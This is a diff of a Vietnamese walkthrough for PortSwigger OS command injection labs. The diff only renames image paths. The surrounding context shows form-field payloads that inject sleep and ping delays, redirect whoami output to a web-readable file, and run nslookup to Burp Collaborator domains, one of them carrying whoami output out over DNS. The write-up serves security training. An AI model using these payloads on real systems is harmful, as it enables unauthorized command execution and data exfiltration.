@@ -22,23 +22,23 @@
 
 - GUI web challenge
     
-    ![image.png](/OS%20command%20injection/Image/image.png)
+    ![image.png](/OS%20command%20injection/images/image.png)
     
 - Bấm vào `View details` 1 product bất kỳ, trang web sẽ điều hướng tới chi tiết sản phẩm
     
-    ![image.png](/OS%20command%20injection/Image/image%201.png)
+    ![image.png](/OS%20command%20injection/images/image%201.png)
     
     → Bấm `Check stock` để xem phản hồi, quan sát trên burp
     
-    ![image.png](/OS%20command%20injection/Image/image%202.png)
+    ![image.png](/OS%20command%20injection/images/image%202.png)
     
 - Thử 1 vài câu lệnh injection
     
-    ![image.png](/OS%20command%20injection/Image/image%203.png)
+    ![image.png](/OS%20command%20injection/images/image%203.png)
     
 - Chỉ cần xem được tên người dùng là đã hoàn thành bài lab
     
-    ![image.png](/OS%20command%20injection/Image/image%204.png)
+    ![image.png](/OS%20command%20injection/images/image%204.png)
     
 
 # **Blind OS command injection vulnerabilities**
@@ -82,15 +82,15 @@
 
 - GUI web challenge
     
-    ![image.png](/OS%20command%20injection/Image/image%205.png)
+    ![image.png](/OS%20command%20injection/images/image%205.png)
     
     → Có một endpoint `Submit feedback`
     
-    ![image.png](/OS%20command%20injection/Image/image%206.png)
+    ![image.png](/OS%20command%20injection/images/image%206.png)
     
     - Thử nhập như bình thường và quan sát ở burp
     
-    ![image.png](/OS%20command%20injection/Image/image%207.png)
+    ![image.png](/OS%20command%20injection/images/image%207.png)
     
     ```bash
     csrf=eCxSKFNvgaHhjNvVBrfRonsY4eKF3Ag5&name=Jayce&email=jaycedang%40gmail.com&subject=IT&message=Hello
@@ -108,30 +108,30 @@
     ping+-c+10+127.0.0.1
     ```
     
-    ![image.png](/OS%20command%20injection/Image/image%208.png)
+    ![image.png](/OS%20command%20injection/images/image%208.png)
     
     - Như vậy là đã hoàn thành lab
     
-    ![image.png](/OS%20command%20injection/Image/image%209.png)
+    ![image.png](/OS%20command%20injection/images/image%209.png)
     
 
 ## **Lab: Blind OS command injection with output redirection**
 
 - GUI web challenge
     
-    ![image.png](/OS%20command%20injection/Image/image%2010.png)
+    ![image.png](/OS%20command%20injection/images/image%2010.png)
     
 - Check vuln tại `endpoint` **Submit feedback**
     
-    ![image.png](/OS%20command%20injection/Image/image%2011.png)
+    ![image.png](/OS%20command%20injection/images/image%2011.png)
     
     - Các `endpoint` tại **/image**
         
-        ![image.png](/OS%20command%20injection/Image/image%2012.png)
+        ![image.png](/OS%20command%20injection/images/image%2012.png)
         
 - Nhập thử thông tin rồi Submit, sau đó xem trên `Burp Repeater`
     
-    ![image.png](/OS%20command%20injection/Image/image%2013.png)
+    ![image.png](/OS%20command%20injection/images/image%2013.png)
     
 - Thử sửa lại payload để check blind OS injection `sleep 10 #`
     
@@ -139,7 +139,7 @@
     +%26+sleep+10+%23
     ```
     
-    ![image.png](/OS%20command%20injection/Image/image%2014.png)
+    ![image.png](/OS%20command%20injection/images/image%2014.png)
     
 - Thử thực thi câu lệnh `whoami` sau đó truy xuất thông tin qua tệp `/var/www/images/output.txt` bằng ký tự `>`
     
@@ -149,28 +149,28 @@
     +%26+whoami>+/var/www/images/output.txt+%23
     ```
     
-    ![image.png](/OS%20command%20injection/Image/image%2015.png)
+    ![image.png](/OS%20command%20injection/images/image%2015.png)
     
 - Get lại tại `endpoint` **GET /image?filename=** nhưng thay bằng tệp output.txt
     
-    ![image.png](/OS%20command%20injection/Image/image%2016.png)
+    ![image.png](/OS%20command%20injection/images/image%2016.png)
     
     → `peter-8Ltz5o`
     
     - Như vậy là đã hoàn thành bài lab
     
-    ![image.png](/OS%20command%20injection/Image/image%2017.png)
+    ![image.png](/OS%20command%20injection/images/image%2017.png)
     
 
 ## **Lab: Blind OS command injection with out-of-band interaction**
 
 - GUI web challenge
     
-    ![image.png](/OS%20command%20injection/Image/image%2018.png)
+    ![image.png](/OS%20command%20injection/images/image%2018.png)
     
 - Dùng thử tính năng submit feedback
     
-    ![image.png](/OS%20command%20injection/Image/image%2019.png)
+    ![image.png](/OS%20command%20injection/images/image%2019.png)
     
 - Sử dụng burp tạo fake domain [`zil20vjhuz35l96nvcg3o61uxl3cr2fr.oastify.com`](http://zil20vjhuz35l96nvcg3o61uxl3cr2fr.oastify.com/) . Sau đó gửi payload
     
@@ -178,24 +178,24 @@
     csrf=sGbFdDJXpZP2fKqkcOPH1t2WGfVm4x6I&name=jayce&email=jaycedang%40gmail.com||nslookup+x.zil20vjhuz35l96nvcg3o61uxl3cr2fr.oastify.com||&subject=IT&message=Hello
     ```
     
-    ![image.png](/OS%20command%20injection/Image/image%2020.png)
+    ![image.png](/OS%20command%20injection/images/image%2020.png)
     
     → Máy chủ đích nếu thực thi lệnh này, nó sẽ gửi yêu cầu DNS đến `oastify.com`, một dịch vụ dùng để phát hiện yêu cầu từ xa. Attacker có thể theo dõi xem truy vấn có được thực thi hay không.
     
     - Như vậy là đã hoàn thành bài lab
     
-    ![image.png](/OS%20command%20injection/Image/image%2021.png)
+    ![image.png](/OS%20command%20injection/images/image%2021.png)
     
 
 ## **Lab: Blind OS command injection with out-of-band data exfiltration**
 
 - GUI web challenge
     
-    ![image.png](/OS%20command%20injection/Image/image%2022.png)
+    ![image.png](/OS%20command%20injection/images/image%2022.png)
     
 - Tiến hành khai thác tại endpoint `Submit feedback`
     
-    ![image.png](/OS%20command%20injection/Image/image%2023.png)
+    ![image.png](/OS%20command%20injection/images/image%2023.png)
     
 - Sử dụng Burp [Collabrator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) để lấy thông tin fake domain, sau đó tiến hành payload
     
@@ -203,14 +203,14 @@
     csrf=juthtTChOc8nA7hY3xWVVvGvWjXnpZgt&name=jayce&email=||nslookup+`whoami`.qoi5knhj9ginkzn4op9193anmes5gw4l.oastify.com||&subject=IT&message=Hello
     ```
     
-    ![image.png](/OS%20command%20injection/Image/image%2024.png)
+    ![image.png](/OS%20command%20injection/images/image%2024.png)
     
 - Quay lại Burp [Collabrator](https://portswigger.net/burp/documentation/desktop/tools/collaborator), thực hiện poll
     
-    ![image.png](/OS%20command%20injection/Image/image%2025.png)
+    ![image.png](/OS%20command%20injection/images/image%2025.png)
     
     → Thông tin `peter-zM9peT` trả về từ câu lệnh payload `whoami`. Submit lên trang web.
     
     - Như vậy là hoàn thành bài lab
 
-    ![image.png](/OS%20command%20injection/Image/image%2026.png)
+    ![image.png](/OS%20command%20injection/images/image%2026.png)
